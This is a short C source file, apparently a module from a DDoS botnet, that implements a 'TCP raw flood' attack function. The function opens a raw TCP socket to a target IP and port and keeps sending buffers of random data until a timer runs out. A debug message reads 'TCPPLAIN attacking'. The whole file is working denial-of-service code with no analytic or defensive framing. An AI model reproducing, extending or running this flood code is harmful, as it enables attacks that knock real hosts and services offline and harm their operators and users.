#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <time.h>

#include "attacks.h"

void attack_tcpraw_flood(char *target, int port, int timer, int data_len)
{
	int fd, i, rfd;
	char *data;

	data = calloc(65535, sizeof(char));

#ifdef DEBUG
	printf("TCPPLAIN attacking: %s:%d time: %d, length: %d\n",
		target, port, timer, data_len);
#endif

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(target);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	time_t start = time(0);
	while (time(0) <= start + timer)
	{

		for(i = 0; i < data_len; i++)
			data[i] = (char)rand() % 0xFFFF;	
		send(fd, data, data_len, MSG_NOSIGNAL);
	}
}
